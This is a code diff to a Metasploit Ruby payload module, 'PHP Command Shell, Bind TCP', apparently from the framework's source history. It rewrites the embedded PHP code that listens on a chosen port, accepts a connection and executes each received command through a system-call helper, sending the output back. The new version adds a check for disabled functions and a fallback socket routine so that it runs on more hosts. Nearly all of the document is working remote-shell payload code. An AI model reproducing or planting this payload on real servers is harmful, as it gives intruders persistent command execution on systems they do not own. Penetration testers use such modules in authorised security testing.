@@ -11,6 +11,7 @@
 
 
 require 'msf/core'
+require 'msf/core/payload/php'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
@@ -22,13 +23,14 @@ module Php
 module BindPhp
 
 	include Msf::Payload::Single
+	include Msf::Payload::Php
 
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'PHP Command Shell, Bind TCP (via php)',
 			'Version'       => '$Revision$',
 			'Description'   => 'Listen for a connection and spawn a command shell via php (persistent)',
-			'Author'        => ['diaul <diaul@devilopers.org>',],
+			'Author'        => ['egypt', 'diaul <diaul@devilopers.org>',],
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'php',
 			'Arch'          => ARCH_PHP,
@@ -47,33 +49,36 @@ module BindPhp
 	# PHP Bind Shell
 	#
 	def php_bind_shell
+
+		dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);
 		shell = <<-END_OF_PHP_CODE
-		error_reporting(E_ALL);
-	
-		set_time_limit(0);
-		ob_implicit_flush();
+		#{php_preamble({:disabled_varname => dis})}
+		$port=#{datastore['LPORT']};
 
-		$port = #{datastore['LPORT']};
-
-		$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-		$ret = socket_bind($sock, 0, $port);
-		$ret = socket_listen($sock, 5);
-		$msgsock = socket_accept($sock);
-
-		while (true)
-		{
-			$command = socket_read($msgsock, 2048, PHP_NORMAL_READ);
-			$output = shell_exec(substr($command, 0, -1));
-			socket_write($msgsock, $output, strlen($output));
-		} 
-	
+		$scl='socket_create_listen';
+		if(is_callable($scl)&&!in_array($scl,#{dis})){
+			$sock=$scl($port);
+		}else{
+			$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+			$ret=socket_bind($sock,0,$port);
+			$ret=socket_listen($sock,5);
+		}
+		$msgsock=socket_accept($sock);
 		socket_close($sock);
+
+		while(FALSE!==socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
+		{
+			
+			$c=socket_read($msgsock,2048,PHP_NORMAL_READ);
+			if(FALSE===$c){break;}
+			#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+			socket_write($msgsock,$o,strlen($o));
+		}
+		socket_close($msgsock);
 		END_OF_PHP_CODE
 		
 		return shell
-
 	end
-
 
 	#
 	# Constructs the payload
@@ -81,7 +86,6 @@ module BindPhp
 	def generate
 		return super + php_bind_shell
 	end
-	
 
 end
 
